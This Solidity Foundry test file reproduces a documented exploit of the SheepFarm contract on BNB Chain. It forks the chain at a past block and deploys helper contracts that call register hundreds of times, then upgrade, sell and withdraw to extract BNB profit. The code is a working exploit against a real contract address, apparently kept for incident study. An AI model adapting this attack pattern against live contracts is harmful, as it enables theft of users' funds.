// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Attack reason: Wrong function logic
// Info about attack: https://twitter.com/BlockSecTeam/status/1592734292727455744
// Tx: https://bscscan.com/tx/0x8b3e0e3ea04829f941ca24c85032c3b4aeb1f8b1b278262901c2c5847dc72f1c

interface ISheepFarm {
    function register(address neighbor) external;

    function addGems() external payable;

    function upgradeVillage(uint256 farmId) external;

    function sellVillage() external;

    function withdrawMoney(uint256 wool) external;
}

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_089_184);
    }

    function testExploit() public {
        uint256 beforeBalance = address(this).balance;

        for (uint256 i; i < 4; ++i) {
            new AttackContract{value: 5e14}();
        }

        uint256 afterBalance = address(this).balance;

        emit log_named_decimal_uint(
            "SheepFarm exploiter profit after attack (in BNB):", afterBalance - beforeBalance, 18
        );
    }

    receive() external payable {}
}

contract AttackContract {
    ISheepFarm public constant Farm = ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
    address public constant neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;

    constructor() payable {
        for (uint256 i; i < 402; ++i) {
            Farm.register(neighbor);
        }

        Farm.addGems{value: 5e14}();

        for (uint256 i; i < 5; ++i) {
            Farm.upgradeVillage(i);
        }

        Farm.sellVillage();

        Farm.withdrawMoney(156_000);

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
